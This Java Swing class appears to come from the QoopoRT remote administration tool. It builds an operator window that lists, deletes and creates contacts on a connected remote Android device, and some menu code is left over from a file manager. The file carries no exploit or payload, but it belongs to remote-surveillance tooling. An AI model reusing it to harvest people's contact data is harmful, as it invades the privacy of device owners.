package qooport.modulos.android;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Component;
import java.awt.Font;
import java.awt.GridLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import javax.swing.BorderFactory;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JList;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.JTextField;
import javax.swing.JToolBar;
import javax.swing.ListCellRenderer;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.DefaultTableModel;
import qooport.asociado.Asociado;
import static qooport.avanzado.QoopoRT.tipoLetra;
import qooport.utilidades.Util;

public class Contactos extends JFrame {

    public JToolBar barra;
    public String sep = "/";
    public boolean conectado;
    private JButton btnActDrives;
    private JTable tabla;
    private DefaultTableModel modelotabla;
    private JScrollPane jScrollPane1;
    private JTextField ruta;
    private JPanel contenedorPrincipal;
    private JPopupMenu menu;
    private JMenuItem eliminar;
    private JMenuItem crearCarpeta;
    private Asociado servidor;
    private String rutaPosterior = "";
    private String seleccionado;
    private ImageIcon[] unidades;
    private JPanel panelInfo;
    private JLabel vistaPrevia;

    public Contactos(Asociado servidor) {
        initComponents();
        this.tabla.getColumnModel().getColumn(0).setCellRenderer(new CeldaIcono());
        this.modelotabla = ((DefaultTableModel) this.tabla.getModel());
        this.servidor = servidor;
    }

    private void initComponents() {
        barra = new JToolBar();
        barra.setFloatable(false);
        this.btnActDrives = new JButton();
        this.jScrollPane1 = new JScrollPane();
        this.menu = new JPopupMenu();
        eliminar = new JMenuItem();
        crearCarpeta = new JMenuItem();
        setResizable(true);
//        setTitle("Administrador de Archivos");
        try {
            setTitle("Contactos [" + servidor.getInformacion() + "]");
        } catch (Exception e) {
            setTitle("Contactos");
        }
//        this.btnIniciarDetener.setFont(new Font("Angelina", 1, 18));
//        this.btnIniciarDetener.setText("Parar");
        btnActDrives.setIcon(Util.cargarIcono16("/resources/refresh.png"));
        this.btnActDrives.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                Contactos.this.btnListarContactos(evt);
            }
        });
        this.eliminar.setText("Eliminar");
        this.eliminar.setIcon(Util.cargarIcono16("/resources/delete.png"));
        this.eliminar.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                Contactos.this.eliminarActionPerformed(evt);
            }
        });
        this.crearCarpeta.setText("Crear Contacto");
        this.crearCarpeta.setIcon(Util.cargarIcono16("/resources/new_folder.png"));
        this.crearCarpeta.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                Contactos.this.crearCarpetaActionPerformed(evt);
            }
        });
        this.menu.add(this.eliminar);
        this.menu.add(this.crearCarpeta);
        tabla = new JTable();
        this.tabla.setComponentPopupMenu(this.menu);
        this.tabla.setAutoCreateRowSorter(true);
        this.tabla.setFont(new Font(tipoLetra, 1, 14));
        this.tabla.setRowHeight(75);
        this.tabla.setModel(new DefaultTableModel(new Object[0][], new String[]{"", "Nombre", "Movil", "Correo"}) {
            boolean[] canEdit = {false, false, false, false};

            public boolean isCellEditable(int rowIndex, int columnIndex) {
                return this.canEdit[columnIndex];
            }
        });
        this.tabla.addMouseListener(new MouseAdapter() {
            public void mouseClicked(MouseEvent evt) {
//                Contactos.this.tablaMouseClick(evt);
            }

            public void mousePressed(MouseEvent evt) {
                Contactos.this.tablaMousePressed(evt);
            }
        });
        this.tabla.getColumnModel().getColumn(0).setMinWidth(50);
        this.tabla.getColumnModel().getColumn(0).setPreferredWidth(75);
        this.tabla.getColumnModel().getColumn(0).setMaxWidth(75);
        ruta = new JTextField();
        this.jScrollPane1.setViewportView(this.tabla);
//        contenedorMenu = new JPanel();
//        contenedorMenu.setLayout(new GridLayout(1, 10));
        barra.add(btnActDrives);
        //   PANEL DE INFO
        vistaPrevia = new JLabel();
//        vistaPrevia.setSize(150, 150);
        vistaPrevia.setIcon(Util.cargarIcono16("/resources/persona.png"));
        panelInfo = new JPanel();
        panelInfo.setLayout(new BorderLayout());
        panelInfo.add(vistaPrevia, BorderLayout.CENTER);
        this.panelInfo.setBorder(BorderFactory.createTitledBorder(null, "Informacion", 0, 0, new Font(tipoLetra, 1, 12), new Color(0, 102, 51)));
        contenedorPrincipal = new JPanel();
        contenedorPrincipal.setLayout(new GridLayout(1, 1));
        contenedorPrincipal.add(jScrollPane1);
        this.setLayout(new BorderLayout());
        this.add(barra, BorderLayout.NORTH);
        this.add(contenedorPrincipal, BorderLayout.CENTER);
        this.add(panelInfo, BorderLayout.WEST);
        this.setSize(400, 600);
//        this.setResizable(true);
        this.setVisible(true);
        pack();
    }

    private void btnListarContactos(ActionEvent evt) {
        servidor.listarContactos();
    }

    public void actualizarLista() {
        servidor.listarContactos();
    }

    public JTable getTabla() {
        return tabla;
    }

    public void setTabla(JTable tabla) {
        this.tabla = tabla;
    }

    public DefaultTableModel getModelotabla() {
        return modelotabla;
    }

    public void setModelotabla(DefaultTableModel modelotabla) {
        this.modelotabla = modelotabla;
    }
//    public ModeloTabla getModelotabla() {
//        return modelotabla;
//    }
//
//    public void setModelotabla(ModeloTabla modelotabla) {
//        this.modelotabla = modelotabla;
//    }

    public void limpiatabla() {
        for (int i = this.tabla.getRowCount() - 1; i > -1; i--) {
            this.modelotabla.removeRow(i);
        }
    }

    public JTextField getRuta() {
        return ruta;
    }

    public void setRuta(JTextField ruta) {
        this.ruta = ruta;
    }

    private void tablaMousePressed(MouseEvent evt) {
        if (this.tabla.getSelectedRowCount() <= 1) {
            int t = this.tabla.rowAtPoint(evt.getPoint());
            this.tabla.getSelectionModel().setSelectionInterval(t, t);
        }
    }

    private void eliminarActionPerformed(ActionEvent evt) {
        int[] selec = this.tabla.getSelectedRows();
        for (int i = 0; i < selec.length; i++) {
            this.seleccionado = this.tabla.getValueAt(selec[i], 1).toString();
            this.rutaPosterior = (this.ruta.getText() + this.sep + this.seleccionado);
            servidor.eliminar(rutaPosterior);
        }
        this.actualizarLista();
    }

    private void crearCarpetaActionPerformed(ActionEvent evt) {
        String carpeta = JOptionPane.showInputDialog(null, "Nombre de Carpeta : ",
                "Crear Carpeta", 1);
        this.servidor.crearCarpeta(carpeta, this.ruta.getText());
        this.actualizarLista();
    }

    static class CeldaIcono extends DefaultTableCellRenderer {

        public void setValue(Object value) {
            if (value == null) {
                setText("");
                setIcon(Util.cargarIcono16("/resources/autor.png"));
            } else {
                byte[] icono = (byte[]) value;
//                Contactos.guardarIcono(icono, "icono2.png");
                try {
                    setIcon(new ImageIcon(icono));
                } catch (Exception e) {
                    setText("Error");
                    e.printStackTrace();
                }
            }
        }
    }

    public static String guardarIcono(byte[] datos, String nombre) {
        if (datos != null) {
            File file = new File(nombre);
            try {
                file.delete();
            } catch (Exception e) {
            }
            try {
                file.createNewFile();
                FileOutputStream fout = new FileOutputStream(file);
                fout.write(datos);
                fout.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return nombre;
    }

    public class ComboBoxRenderer extends JLabel
            implements ListCellRenderer {

        public ComboBoxRenderer() {
            setOpaque(true);
            setHorizontalAlignment(CENTER);
            setVerticalAlignment(CENTER);
        }

        /*
         * This method finds the image and text corresponding
         * to the selected value and returns the label, set up
         * to display the text and image.
         */
        @Override
        public Component getListCellRendererComponent(
                JList list,
                Object value,
                int index,
                boolean isSelected,
                boolean cellHasFocus) {
            try {
                int selectedIndex = ((Integer) value).intValue();
                if (isSelected) {
                    setBackground(list.getSelectionBackground());
                    setForeground(list.getSelectionForeground());
                } else {
                    setBackground(list.getBackground());
                    setForeground(list.getForeground());
                }
                //Set the icon and text.  If icon was null, say so.
                ImageIcon icon = unidades[selectedIndex];
                String texto = unidades[selectedIndex].getDescription();
                setIcon(icon);
                if (icon != null) {
                    setText(texto);
//                setFont(list.getFont());
                } else {
                    setText("");
                }
            } catch (Exception e) {
//                e.printStackTrace();
            }
            return this;
        }
    }

    public ImageIcon[] getUnidades() {
        return unidades;
    }

    public void setUnidades(ImageIcon[] unidades) {
        this.unidades = unidades;
    }

    public JLabel getVistaPrevia() {
        return vistaPrevia;
    }

    public void setVistaPrevia(JLabel vistaPrevia) {
        this.vistaPrevia = vistaPrevia;
    }
}
